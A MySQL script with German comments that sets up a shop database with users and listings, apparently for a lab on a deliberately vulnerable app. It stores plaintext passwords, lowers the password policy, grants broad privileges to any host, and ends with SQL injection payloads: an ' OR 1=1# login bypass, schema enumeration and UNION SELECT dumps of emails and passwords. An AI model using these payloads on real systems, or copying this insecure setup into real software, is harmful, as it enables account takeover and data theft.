
# database aufmachen
create database shopdb;

# show database;
show databases;

# verwende database
use shopdb;

# get details of table
describe shopdb;

#Datenbanken erstellen

CREATE TABLE User (
    user_ID CHAR(36) NOT NULL,
    seller_name VARCHAR(100) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    PRIMARY KEY (user_ID)
);

INSERT INTO User (user_ID, seller_name, email, password) VALUES
(UUID(), 'Tester', 'test@test.com', 'test'),
(UUID(), 'RetroRebell', 'antik@anarchie.net', 'altaberlaut'),
(UUID(), 'SecondhandSkeptiker', 'gebraucht@glaubichnicht.de', 'vielleichtneu'),
(UUID(), 'TrödelTherapeut', 'heilung@haushaltswaren.de', 'redenhilft');

CREATE TABLE Artikel (
    article_ID INT AUTO_INCREMENT,
    user_ID CHAR(36) NOT NULL,
    title VARCHAR(150) NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    state VARCHAR(50),
    location VARCHAR(100),
    postalcode VARCHAR(10),
    description VARCHAR(1200),
    negotiable BOOLEAN DEFAULT FALSE,
    image_url VARCHAR(500),
    phone_number VARCHAR(25),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (article_ID),
    CONSTRAINT fk_article_user FOREIGN KEY (user_ID)
        REFERENCES User(user_ID)
        ON DELETE CASCADE
        ON UPDATE CASCADE
);

Insert into Artikel(user_ID, title, price, state, location, postalcode, description, image_url, phone_number) 
Values ('e0abcdca-b11b-11f0-a23a-7085c267bdd3', 'Kaputte Drohne', 10.99, 'Alt', 'Albstadt', '11111', 'Leider kaputt gekauft, an Sammler abzugeben', '../static/img/logo2.jpg', '111111'),
							('e0abcdca-b11b-11f0-a23a-7085c267bdd3', 'Kaputte Drohne', 10.99, 'Alt', 'Albstadt', '11111', 'Leider kaputt gekauft, an Sammler abzugeben', '../static/img/logo2.jpg', '111111');



# set password policy
SET GLOBAL validate_password_policy=LOW;
# create users (das )
CREATE USER 'shopuser'@'%' IDENTIFIED WITH mysql_native_password BY 'Heute000';
# oben hat nicht getan:
alter user 'buguser'@'%' identified with mysql_native_password by 'Heute000'
# grant full privileges
GRANT CREATE, ALTER, DROP, INSERT, UPDATE, DELETE, SELECT, REFERENCES, RELOAD on *.* TO 'shopuser'@'%' WITH GRANT OPTION;
# grant partial privileges
GRANT INSERT, SELECT, DELETE, DROP, UPDATE on ticketdb.* TO 'buguser'@'%';


#show grants
show grants for 'shopuser'@'%';

#remove grants
revoke all on *.* from 'buguser'@'%';


# Datensatz
Delete From User Where user_ID = 'c33bba8f-b0f4-11f0-a23a-7085c267bdd3';
Select * From User;
Select * From Artikel;


# SQL-Injection (Login)
SELECT schema_name FROM information_schema.schemata;-- ;
SELECT table_name FROM information_schema.tables; -- # Meta-Informationen zu Tabellen
SELECT column_name FROM information_schema.columns WHERE table_name='Artikel';-- # Tabellen auslesen (Spalten)
# 'OR 1=1#
SELECT user_ID FROM User WHERE email = 'bob@bob.com' and password = ''OR 1=1#';
# Union Select
Select seller_name from User where user_ID = "2db0744a-b0ff-11f0-a23a-7085c267bdd3" Union SELECT CONCAT(user_ID, ' | ', seller_name, ' | ', email, ' | ', password) AS user_summary FROM User;
#2db0744a-b0ff-11f0-a23a-7085c267bdd3' Union SELECT CONCAT(user_ID, '|', seller_name, '|', email, '|', password) AS user_summary FROM User #
# ' Union Select concat(article_ID, '|' , user_ID, '|', title, '|', price, '|', state, '|', location, '|', postalcode, '|', description, '|', negotiable, '|', image_url, '|', phone_number, '|', created_at) As artikel_summary From Artikel #